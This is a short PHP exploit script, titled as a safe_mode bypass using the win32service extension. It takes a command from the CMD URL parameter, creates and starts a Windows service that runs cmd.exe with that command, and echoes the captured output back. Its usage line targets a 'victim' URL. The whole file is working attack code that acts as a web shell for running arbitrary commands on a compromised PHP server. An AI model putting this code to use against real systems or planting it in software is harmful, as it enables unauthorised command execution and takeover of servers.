<?php

#####################################################
### PHP Safe_mode bypass exploit (win32service)   ###
###                                               ###
### Note: Tested on 5.2.1                         ###
###                                               ###
### Author:  NetJackal                            ###
### Email:   nima_501[at]yahoo[dot]com            ###
### Website: http://netjackal.by.ru               ###
###                                               ###
###                                               ###
### Usage: http://victim.net/nj.php?CMD=[command] ###
#####################################################

$command=(isset($_GET['CMD']))?$_GET['CMD']:'dir'; #cammand
$dir=ini_get('upload_tmp_dir'); #Directory to store command's output

if(!extension_loaded('win32service'))die('win32service extension not found!');
$name=$dir."\\".uniqid('NJ');
$n=uniqid('NJ');
$cmd=(empty($_SERVER['ComSpec']))?'d:\\windows\\system32\\cmd.exe':$_SERVER['ComSpec'];
win32_create_service(array('service'=>$n,'display'=>$n,'path'=>$cmd,'params'=>"/c $command >\"$name\""));
win32_start_service($n);
win32_stop_service($n);
win32_delete_service($n);
$exec=file_get_contents($name);
unlink($name);
echo "<pre>".htmlspecialchars($exec)."</pre>";
?>
